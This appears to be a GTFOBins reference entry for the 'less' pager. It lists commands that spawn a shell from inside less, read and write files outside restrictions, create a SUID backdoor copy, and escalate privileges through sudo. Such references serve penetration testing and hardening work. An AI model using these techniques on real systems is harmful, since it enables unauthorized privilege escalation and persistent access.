# GTFOBin: less

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
less /etc/profile
!/bin/sh
```

```
VISUAL="/bin/sh -c '/bin/sh'" less /etc/profile
v
```

```
less /etc/profile
v:shell
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

```
echo DATA | less
sfile_to_write
q
```

This invokes the default editor to edit the file. The file must exist.

```
less file_to_write
v
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
less file_to_read
```

This is useful when `less` is used as a pager by another binary to read a different file.

```
less /etc/profile
:e file_to_read
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which less) .

./less file_to_read
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo less /etc/profile
!/bin/sh
```